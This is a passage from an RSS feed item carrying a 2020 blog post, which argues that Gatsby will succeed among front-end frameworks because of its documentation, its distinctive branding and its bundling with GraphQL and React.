often than other sources (very common in web dev), you can be sure that that technology has pretty good documentation. Usually, there are many alternatives to technology’s own official docs for most use cases (StackOverflow being one big one). Finding yourself on the official docs more often than not is a good sign.</p><p>I find Gatsby’s docs a lot better than the docs I’ve found in a few other Front End Frameworks.&nbsp;</p><p>Gatsby docs are a lot less jargon-filled and easier to parse. This, even when you are a developer who can understand the jargon, is a massive benefit.&nbsp;</p><h4><strong>4. A unique design aesthetic that stands out</strong></h4><p>Most frameworks have forgettable designs.</p><p>My guess is that this is partly down to the developer’s focus on how it works rather than how it looks.</p><p>Gatsby seems to take a different approach. It’s hard to forget Gatsby’s big purple G once you see it, along with its overall very well designed and consistent website design and general branding.&nbsp;</p><p>This is bigger than people think when it comes to user adoption (which is the most important UX consideration for new technologies), particularly within the front end development space, where the overlap of design and development is only becoming more obvious.</p><p>Gatsby is the clear winner in this space.&nbsp;</p><h4><strong>5. Strong alignments (bundling) with other key, fast-growing technologies (GraphQL, ReactJS)</strong></h4><p>Since the beginning of the software industry, bundling has been a key method of growing the market share of individual pieces of software. For the most part, software needs a lot of other parts to work functionally, so the logic behind also selling them together conceptually is a natural extension.&nbsp;</p><p>Microsoft, the largest software company in the world, became (in a <a target="_blank" title="https://www.ozy.com/true-and-stories/the-agreement-that-catapulted-microsoft-over-ibm/94437/" href="https://www.ozy.com/true-and-stories/the-agreement-that-catapulted-microsoft-over-ibm/94437/">now infamous</a> deal) what it is today by bundling its MS-Dos operating system with an early IBM desktop machine.</p><p>Apple’s launch of the iPhone, and its eventual dominance in the market was largely fueled by its bundling of its phone with the millions of applications that developers ultimately filled within their app store.&nbsp;</p><p>Within the Front End Framework space, Gatsby has done a very good job of bundling itself with GraphQL. Most searches of GraphQL on Google and YouTube very often pull up a Gatsby related tutorial, which means that in some small way, they are beginning to become synonymous. Even more so than other frameworks have managed to so far.</p><p>Gatsby’s close association with the React community has also done a lot to propel its position within the Front End Framework space.</p><h4><strong>UX Determines Adoption, Adoption Determines Success</strong></h4><p>Ultimately, among the many Front End Frameworks that exist, Gatsby is built in the right way to succeed. Having hit a lot of the key UX points outlined above, it is the choice I’d most highly recommend for a Front End Developer looking for the right framework to use for your next project.</p></div></div>]]>
            </description>
            <link>https://planflow.dev/blog/5-ux-reasons-why-gatsby-will-win</link>
            <guid isPermaLink="false">hacker-news-small-sites-24531185</guid>
            <pubDate>Sun, 20 Sep 2020 00:32:14 GMT</pubDate>
        </item>
    </channel>
</rss>
